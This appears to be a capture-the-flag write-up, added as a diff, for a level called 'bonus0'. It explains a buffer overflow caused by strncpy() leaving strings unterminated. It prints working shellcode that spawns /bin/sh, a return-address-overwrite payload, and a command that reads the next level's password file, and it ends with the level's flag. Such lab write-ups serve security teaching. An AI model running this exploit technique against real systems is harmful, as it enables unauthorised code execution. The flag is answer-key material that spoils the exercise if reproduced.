@@ -1,0 +1,167 @@
+# Bonus0 - Buffer Overflow via Missing Null Terminator
+
+## Vulnerability Type
+**Buffer Overflow** caused by missing null terminator in `strncpy()`
+
+## Quick Solution
+
+```bash
+# Set up shellcode in environment
+export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+
+# Execute exploit (return address: 0xbffff8a0)
+(python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xa0\xf8\xff\xbf' + 'C'*7"; cat) | ./bonus0
+
+# Get the password
+cat /home/user/bonus1/.pass
+```
+
+## The Vulnerability
+
+### Code Analysis
+
+```c
+void p(char *dest, char *prompt) {
+    char big_buffer[4104];
+    char *newline_ptr;
+    
+    puts(prompt);
+    read(0, big_buffer, 4096);
+    newline_ptr = strchr(big_buffer, '\n');
+    *newline_ptr = '\0';
+    strncpy(dest, big_buffer, 20);  // ← BUG: No null terminator!
+}
+
+void pp(char *buff) {
+    char str1[20];
+    char str2[20];
+    
+    p(str1, " - ");
+    p(str2, " - ");
+    
+    strcpy(buff, str1);  // ← OVERFLOW if str1 has no null terminator!
+    
+    size_t len = strlen(buff);
+    buff[len] = ' ';
+    buff[len + 1] = '\0';
+    
+    strcat(buff, str2);
+}
+```
+
+### The Problem
+
+1. `strncpy(dest, src, 20)` copies **exactly** 20 bytes
+2. If source has 20+ characters, **no null terminator** is added
+3. `strcpy(buff, str1)` expects a null-terminated string
+4. Without null terminator, `strcpy()` keeps copying past str1
+5. It copies str1 + str2 + stack data → **buffer overflow!**
+
+## Memory Layout
+
+### Stack in pp() function
+
+```
+Lower addresses
+┌─────────────────────────────────┐
+│ str1[20]                        │ ← First input (no null if full)
+├─────────────────────────────────┤
+│ str2[20]                        │ ← Second input (contains ret addr)
+├─────────────────────────────────┤
+│ Saved registers                 │
+├─────────────────────────────────┤
+│ Return address                  │ ← Target for overwrite!
+└─────────────────────────────────┘
+Higher addresses
+```
+
+### Overflow Mechanism
+
+When both inputs are 20 bytes (no null terminator):
+
+```
+strcpy(buff, str1) copies:
+- str1 (20 bytes)
+- str2 (20 bytes) ← Keeps going!
+- More stack data  ← Keeps going!
+- Return address   ← Overwritten!
+```
+
+## Exploitation Strategy
+
+### Step 1: Place Shellcode in Environment
+
+```bash
+export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+```
+
+- 100 NOP bytes (\x90) for NOP sled
+- Shellcode to execute /bin/sh
+
+### Step 2: Craft Payload
+
+```python
+# First input: Fill the 4096-byte buffer (triggers no null terminator)
+first_input = 'A' * 4095 + '\n'
+
+# Second input: 9 bytes + return address + padding
+second_input = 'B' * 9 + '\xa0\xf8\xff\xbf' + 'C' * 7
+```
+
+### Step 3: Payload Structure
+
+```
+First input (4095 bytes):
+[AAAA...] → Fills big_buffer, strncpy copies 20 bytes with NO null
+
+Second input (20 bytes):
+[BBBBBBBBB][ret_addr][CCCCCCC]
+ 9 bytes    4 bytes   7 bytes
+           ↑
+           0xbffff8a0 (points to SHELLCODE in environment)
+```
+
+### Step 4: Overflow Execution
+
+```
+1. p(str1, " - ") → str1 = "AAAAAAAAAAAAAAAAAAA" (20 bytes, no null)
+2. p(str2, " - ") → str2 = "BBBBBBBBB\xa0\xf8\xff\xbfCCCCCCC" (20 bytes)
+3. strcpy(buff, str1) → Copies str1 + str2 + more
+4. Return address overwritten with 0xbffff8a0
+5. Function returns → Jumps to shellcode!
+```
+
+## Why This Works
+
+| Protection | Status | Impact |
+|------------|--------|--------|
+| NX (DEP) | Disabled | Stack/heap executable |
+| ASLR | Disabled | Predictable addresses |
+| Stack Canary | None | No overflow detection |
+| RELRO | None | Not relevant |
+
+## Key Concepts
+
+### strncpy() Pitfall
+
+```c
+char dest[20];
+strncpy(dest, "12345678901234567890", 20);
+// dest is NOT null-terminated!
+// strlen(dest) will read past the buffer!
+```
+
+### Correct Usage
+
+```c
+char dest[20];
+strncpy(dest, src, 19);  // Leave room for null
+dest[19] = '\0';         // Ensure null termination
+```
+
+## Flag
+
+```
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+
